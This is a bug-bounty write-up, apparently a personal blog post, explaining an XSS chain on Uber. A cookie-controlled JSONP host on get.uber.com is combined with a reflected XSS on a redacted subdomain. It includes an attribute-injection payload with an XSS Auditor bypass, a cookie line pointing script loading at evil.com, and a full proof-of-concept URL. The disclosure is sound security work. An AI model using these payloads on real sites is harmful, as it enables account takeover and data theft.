---
layout: post
title: Uber XSS via Cookie
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - zhchbin</p>

&nbsp;&nbsp;&nbsp;This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.

## JSONP Request

&nbsp;&nbsp;&nbsp;Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was `https://get.uber.com`. Let’s look at what I had found at that time.

{% highlight javascript %}
idrCall: function() {
    var a, b;
    return this.idrCallPending ? void 0 : (this.log("making idr call"),
    a = this.rfiServer ? this.rfiServer : "a.rfihub.com",
    b = this.getProtocol() + "//" + a + "/idr.js",
    this.jsonpGet(b, {}, this.idrCallback, "cmZpSWRJbkNhY2hl"),
    this.idrCallPending = !0)
},
{% endhighlight %}

<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg">

&nbsp;&nbsp;&nbsp;Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of `this.rfiServer` could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about `rfiServer`.

<img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg">

After reading through these lines of code:

{% highlight javascript %}
a = this.readCookie("_rfiServer"),
null != a && this.setRfiServer(a),
{% endhighlight %}

&nbsp;&nbsp;&nbsp;We could get the information that the initial value of `this.rfiServer` was set by using value of cookie `_rfiServer` if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:

* HTTP Header CRLF Injection at any subdomain of uber.com
* XSS at any subdomain of uber.com

What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?

## The Feature of Cookie

&nbsp;&nbsp;&nbsp;Any subdomain of uber.com can set cookie with domain `.uber.com` to be used across subdomains. For instance, we can set cookie in `xxx.uber.com` using following code, then `get.uber.com` will use the cookie value.

{% highlight javascript %}
document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
{% endhighlight %}

<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg">

## XSS of .uber.com which is Out of Scope

I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain `<redacted>.uber.com` for demo.

<img src="https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg">

1. `"` is reflected and not encoded. We can inject any attribution into `input` tag.
2. `type="text"` is after the injection point. So we can inject `type="image" src="1" onerror="alert(1)"`. Note that when there is two types, the second one will be ignored.
3. `>` is removed!!! This can be used to bypass Chrome XSS Auditor. How? `o>nerror.`

## Summary

1. Use reflected XSS of `<redacted>.uber.com` to set the value of `_rfiServer `cookie to `evil.com`
2. Visit `get.uber.com`, JSONP request to `https://evil.com/idr.js`, XSS of `get.uber.com` is done.
3. The final PoC

{% highlight javascript %}
https://<redacted>.uber.com/<redacted>?
email=aaa"%20type%3d"image"%20src%3d1%20o>nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))
#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";
{% endhighlight %}

Thanks for Uber. Reward: 5k

